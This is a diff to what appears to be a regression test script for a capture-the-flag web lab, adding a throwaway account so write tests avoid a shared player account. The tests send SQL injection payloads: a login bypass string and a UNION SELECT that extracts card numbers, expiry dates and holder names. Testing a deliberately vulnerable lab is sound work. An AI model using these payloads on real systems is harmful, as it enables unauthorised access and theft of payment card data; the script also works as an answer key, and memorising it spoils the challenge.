@@ -91,9 +91,18 @@ def gate_login():
 # --- Week 1 ------------------------------------------------------------------
 def week1():
     print("Week 1:")
+    # W1-01 uses the login bypass (lands on client 1, whose dashboard has the flag)
     req("POST", "/login", {"username": "' OR '1'='1'-- ", "password": "x"})
     _, dash = get("/dashboard")
     check("W1-01 SQLi login bypass", bool(flag_in(dash)), flag_in(dash) or "no flag")
+
+    # Everything that WRITES (the W1-03 transfer) then runs on a throwaway
+    # registered account, so the suite never leaves test transfers in the shared
+    # client-1 account that players browse.
+    email = "regr_%s@test.local" % os.urandom(4).hex()
+    req("POST", "/register",
+        {"email": email, "password": "regr-pass-123", "password2": "regr-pass-123"})
+    req("POST", "/login", {"username": email, "password": "regr-pass-123"})
 
     q = "' UNION SELECT card_number, expiry, card_holder, status FROM cards-- "
     _, body = get("/transactions" + qs(q=q))
